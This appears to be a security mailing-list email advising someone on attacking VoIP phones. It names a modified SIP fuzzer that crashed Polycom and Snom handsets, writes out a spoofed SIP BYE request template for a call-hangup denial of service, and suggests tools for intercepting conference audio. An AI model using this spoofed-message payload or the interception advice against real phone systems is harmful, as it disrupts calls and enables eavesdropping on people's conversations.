Hey Paul,

I have a modified version of Asteroid lying on one of my
servers that affected Polycoms, Snoms, Hitachi WiFi's,
and possibly a few others.

Offhand you could with high probability generate a hangup
DoS if you know enough about the network topology. E.g.:

   BYE sip:victim.phone.com SIP/2.0
   Via: SIP/2.0/TCP spoofed.pbx.server.com:5060
   Max-Forwards: 70
   From: Spoofed <sip:spoofed.pbx.server.com>
   To: VICTIM <sip:victim@...tim.phone.com>
   Call-ID: $GENERATE_CID_NUMBER@...tim.phone.com
   CSeq: 1 BYE
   Content-Length: 0

You could take a look at Asteroid and target a Polycom
with it. I haven't bothered much with them. Cisco's
aren't vuln to much I've thrown at them yet.
(greetings Dario@^C*).

As for video (H323) check out voippong: You may be able
to intercept the audio streams out of the conference
depending on the setup. (Asterisk doesn't do H323)...
Maybe a combination of Yates, VoIPPong and others. HTH
